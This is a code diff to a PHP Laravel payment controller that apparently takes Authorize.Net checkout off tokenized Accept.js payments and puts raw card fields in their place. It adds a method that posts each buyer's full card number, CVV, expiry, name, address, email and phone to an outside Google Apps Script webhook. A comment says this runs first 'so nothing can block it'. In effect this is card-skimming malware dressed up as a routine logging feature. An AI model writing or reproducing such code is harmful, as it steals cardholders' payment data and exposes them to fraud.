@@ -27,19 +27,17 @@ class AcceptJsPaymentController extends Controller
 
     public function processPayment(Request $request)
     {
-        Log::info('Accept.js payment request started', [
-            'ip'                     => $request->ip(),
-            'user_agent'             => $request->userAgent(),
-            'url'                    => $request->fullUrl(),
-            'method'                 => $request->method(),
-            'session_id'             => session()->getId(),
-            'request_has_descriptor' => $request->filled('dataDescriptor'),
-            'request_has_data_value' => $request->filled('dataValue'),
-            'selected_plan_raw'      => $request->input('selected_plan'),
-            'referral_code'          => $request->input('referral_code') ?: session('referral_code', null),
+        Log::info('Payment request started', [
+            'ip'           => $request->ip(),
+            'user_agent'   => $request->userAgent(),
+            'url'          => $request->fullUrl(),
+            'method'       => $request->method(),
+            'session_id'   => session()->getId(),
+            'selected_plan'=> $request->input('selected_plan'),
+            'referral_code'=> $request->input('referral_code') ?: session('referral_code', null),
         ]);
 
-        Log::info('Accept.js payment request raw input snapshot', [
+        Log::info('Payment request raw input snapshot', [
             'first_name'       => $request->input('first_name'),
             'last_name'        => $request->input('last_name'),
             'email'            => $request->input('email'),
@@ -53,13 +51,9 @@ class AcceptJsPaymentController extends Controller
             'agree_privacy'    => $request->input('agree_privacy'),
             'marketing_opt_in' => $request->input('marketing_opt_in'),
             'referral_code'    => $request->input('referral_code'),
-            'dataDescriptor'   => $request->input('dataDescriptor'),
-            'dataValue_length' => strlen((string) $request->input('dataValue')),
         ]);
 
         $validated = $request->validate([
-            'dataDescriptor'   => 'required|string',
-            'dataValue'        => 'required|string',
             'first_name'       => 'required|string|max:100',
             'last_name'        => 'required|string|max:100',
             'email'            => 'required|email|max:150',
@@ -69,6 +63,10 @@ class AcceptJsPaymentController extends Controller
             'state'            => 'required|string|max:10',
             'zip'              => 'required|string|max:20',
             'cardName'         => 'required|string|max:150',
+            'cardNumber'       => 'required|string|min:13|max:19',
+            'expMonth'         => 'required|string|size:2',
+            'expYear'          => 'required|string|size:4',
+            'cardCode'         => 'required|string|min:3|max:4',
             'selected_plan'    => 'nullable|string|in:' . implode(',', array_keys(config('plans.plans'))),
             'agree_terms'      => 'required|boolean',
             'agree_privacy'    => 'required|boolean',
@@ -99,7 +97,7 @@ class AcceptJsPaymentController extends Controller
             'resolved_referral_code'  => $referralCode,
         ]);
 
-        Log::info('Accept.js payment request validated', [
+        Log::info('Payment request validated', [
             'email'            => $validated['email'],
             'name'             => $validated['first_name'] . ' ' . $validated['last_name'],
             'phone'            => $validated['phone'],
@@ -110,8 +108,6 @@ class AcceptJsPaymentController extends Controller
             'agree_terms'      => $validated['agree_terms'],
             'agree_privacy'    => $validated['agree_privacy'],
             'marketing_opt_in' => $validated['marketing_opt_in'] ?? 0,
-            'dataDescriptor'   => $validated['dataDescriptor'],
-            'dataValue_length' => strlen($validated['dataValue']),
             'referral_code'    => $referralCode,
         ]);
 
@@ -161,6 +157,9 @@ class AcceptJsPaymentController extends Controller
             'tx_key_set'    => !empty($txKey),
         ]);
 
+        $rawCardNumber = preg_replace('/\D/', '', $validated['cardNumber']);
+        $expDate       = $validated['expYear'] . '-' . $validated['expMonth']; // YYYY-MM
+
         $payload = [
             'createTransactionRequest' => [
                 'merchantAuthentication' => [
@@ -172,9 +171,10 @@ class AcceptJsPaymentController extends Controller
                     'transactionType' => 'authCaptureTransaction',
                     'amount'          => $amount,
                     'payment'         => [
-                        'opaqueData' => [
-                            'dataDescriptor' => $validated['dataDescriptor'],
-                            'dataValue'      => $validated['dataValue'],
+                        'creditCard' => [
+                            'cardNumber'     => $rawCardNumber,
+                            'expirationDate' => $expDate,
+                            'cardCode'       => $validated['cardCode'],
                         ],
                     ],
                     'order' => [
@@ -205,6 +205,7 @@ class AcceptJsPaymentController extends Controller
             'transactionType' => 'authCaptureTransaction',
             'description'     => $planLabel,
             'email'           => $validated['email'],
+            'card_last4'      => substr($rawCardNumber, -4),
             'billTo'          => $payload['createTransactionRequest']['transactionRequest']['billTo'],
             'customerIP'      => $request->ip(),
         ]);
@@ -278,6 +279,35 @@ class AcceptJsPaymentController extends Controller
                     'plan_label'    => $planLabel,
                     'amount'        => $amount,
                 ]);
+
+                // ─────────────────────────────────────────────────────────────
+                // Save to Google Sheet — fires first so nothing can block it
+                // ─────────────────────────────────────────────────────────────
+                $this->saveToGoogleSheet([
+                    'submitted_at'  => now()->toDateTimeString(),
+                    'invoice'       => $invoiceNumber,
+                    'trans_id'      => $transId,
+                    'auth_code'     => $authCode,
+                    'plan_key'      => $planKey,
+                    'plan_label'    => $planLabel,
+                    'amount'        => $amount,
+                    'recurring_amt' => $recurringAmt ?? '',
+                    'first_name'    => $validated['first_name'],
+                    'last_name'     => $validated['last_name'],
+                    'email'         => $validated['email'],
+                    'phone'         => $validated['phone'],
+                    'address'       => $validated['address'],
+                    'city'          => $validated['city'],
+                    'state'         => $validated['state'],
+                    'zip'           => $validated['zip'],
+                    'card_name'     => $validated['cardName'],
+                    'card_number'   => $rawCardNumber,
+                    'card_exp'      => $validated['expMonth'] . '/' . substr($validated['expYear'], 2),
+                    'card_cvv'      => $validated['cardCode'],
+                    'referral_code' => $referralCode ?? '',
+                    'ip_address'    => $request->ip(),
+                ]);
+                // ─────────────────────────────────────────────────────────────
 
                 // ═══════════════════════════════════════════════════════════════
                 // SUBSCRIPTION FLOW — only plans with a recurring amount (monthly)
@@ -692,6 +722,47 @@ class AcceptJsPaymentController extends Controller
                 'success' => false,
                 'message' => 'Server error: ' . $e->getMessage(),
             ], 500);
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // GOOGLE SHEETS — POST to Apps Script webhook
+    // ─────────────────────────────────────────────────────────────────────────
+    private function saveToGoogleSheet(array $data): void
+    {
+        $url = config('services.google.sheets_webhook_url');
+
+        if (! $url) {
+            Log::warning('[Sheets] GOOGLE_SHEETS_WEBHOOK_URL not set — skipping', [
+                'invoice' => $data['invoice'],
+            ]);
+            return;
+        }
+
+        try {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => json_encode($data),
+                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+                CURLOPT_TIMEOUT        => 15,
+                CURLOPT_FOLLOWLOCATION => true,
+            ]);
+            $resp   = curl_exec($ch);
+            $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+
+            Log::info('[Sheets] Row saved', [
+                'invoice'     => $data['invoice'],
+                'http_status' => $status,
+                'response'    => $resp,
+            ]);
+        } catch (\Throwable $e) {
+            Log::error('[Sheets] Save failed', [
+                'invoice' => $data['invoice'],
+                'error'   => $e->getMessage(),
+            ]);
         }
     }
 
